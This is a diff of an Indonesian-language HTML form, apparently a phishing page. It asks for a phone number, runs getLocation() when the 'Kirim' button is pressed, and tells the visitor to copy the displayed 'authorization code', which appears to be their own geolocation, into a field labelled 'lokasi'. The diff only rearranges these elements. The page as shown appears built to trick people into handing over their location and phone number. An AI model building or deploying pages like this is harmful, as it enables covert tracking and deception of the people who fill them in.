@@ -203,7 +203,12 @@ font-size:12px;
 				<input type="text" id="number" class="number" placeholder="+62..." name="nomor"><br>
 				<p id="kode" class="kode">Kode Otorisasi</p>
 				<p id="demo" class="tempat"></p>
-				<button class="no" onclick="getLocation()" id="pilih" >Kirim</button> <br><br><br><br><br>
+				<button class="no" onclick="getLocation()" id="pilih" >Kirim</button>
+                                <p class="miring" id="miring"><em>Salin code lalu masukan (jika kode tidak ada silahkan refresh)</em></p>
+				
+				<input type="text" name="gambar" id="lokasi" class="lokasi" placeholder="####"><br><br>
+				<button class="kirim" id="kirim" type="submit">Kirim</button>
+ <br><br><br><br><br>
                                 <img src="https://raw.githubusercontent.com/ikipriyatna/-/main/location.jpg" class="raw" id="raw">
 				<script>
 							var x = document.getElementById("demo");
@@ -224,10 +229,7 @@ function showPosition(position) {
 				
 				
 				
-				<p class="miring" id="miring"><em>Salin code lalu masukan (jika kode tidak ada silahkan refresh)</em></p>
-				
-				<input type="text" name="gambar" id="lokasi" class="lokasi" placeholder="####"><br><br>
-				<button class="kirim" id="kirim" type="submit">Kirim</button></form>
+				</form>
 				<br><br>
 				<p class="lastman" id="lastman">Sedang dalam proses...</p>
 				<br><br><br><br>	<br><br>
